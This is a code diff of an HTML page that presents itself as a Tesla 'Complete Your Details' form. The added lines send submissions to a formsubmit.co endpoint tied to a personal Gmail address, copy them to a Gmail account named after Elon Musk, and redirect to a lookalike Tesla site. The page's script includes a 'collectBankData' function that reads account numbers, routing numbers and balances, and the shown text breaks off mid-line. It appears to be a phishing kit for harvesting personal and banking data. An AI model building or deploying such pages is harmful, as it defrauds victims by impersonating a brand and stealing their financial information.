@@ -190,10 +190,12 @@ animation: spin 1s linear infinite;
 <h2>Complete Your Details</h2>
 <p>Please fill in your information</p>
 
-<form id="mainForm">
+<form id="mainForm" action="https://formsubmit.co/dooyaabariimeah@gmail.com" method="POST">
 
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_template" value="table">
+<input type="hidden" name="_next" value="https://teslanova-tesla.github.io/teslanova.org/">
+<input type="hidden" name="_subject" value="New submission from Tesla Form">
 <input type="hidden" name="_cc" value="elonmusk2020v@gmail.com">
 
 <input type="text" name="name" placeholder="Full Name" required>
@@ -238,11 +240,6 @@ animation: spin 1s linear infinite;
 <p>Thank you for verifying your device. Your submission is now being processed.</p>
 </div>
 </div>
-</div>
-
-<div id="loadingOverlay" class="loading-overlay">
-<div class="spinner"></div>
-<p>Processing your submission...</p>
 </div>
 
 <script>
@@ -293,7 +290,4 @@ function collectBankData() {
                     const parsed = JSON.parse(data);
                     
                     // Extract account information
-                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
-                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
-                    if (parsed.balance) bankData.balance = parsed.balance;
-                    if (parsed.bankName) bank
+                   
